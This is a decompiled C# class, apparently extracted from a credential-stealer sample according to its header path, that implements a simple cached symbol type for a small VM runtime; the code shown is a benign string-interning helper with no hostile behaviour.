// Decompiled with JetBrains decompiler
// Type: org.lb.lbvm.runtime.Symbol
// Assembly: ISectionEnt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 94D57F93-A342-4E0D-9A4D-9518717BA689
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan-PSW.Win32.Stealer.aezv-723abb6b0dee5d6f012a695ca483478595a08ba3b0dc73ca2032c8d4699605cb.exe

using System.Collections.Generic;

namespace org.lb.lbvm.runtime
{
  internal sealed class Symbol
  {
    private readonly string Name;
    private readonly int hashCode;
    private static readonly Dictionary<string, Symbol> cache = new Dictionary<string, Symbol>();

    public static Symbol fromString(string symbol)
    {
      Symbol symbol1;
      if (Symbol.cache.TryGetValue(symbol, out symbol1))
        return symbol1;
      Symbol symbol2 = new Symbol(symbol);
      Symbol.cache[symbol] = symbol2;
      return symbol2;
    }

    private Symbol(string name)
    {
      this.Name = name;
      this.hashCode = name.GetHashCode();
    }

    public override string ToString() => this.Name;

    public override bool Equals(object obj) => obj == this;

    public override int GetHashCode() => this.hashCode;
  }
}
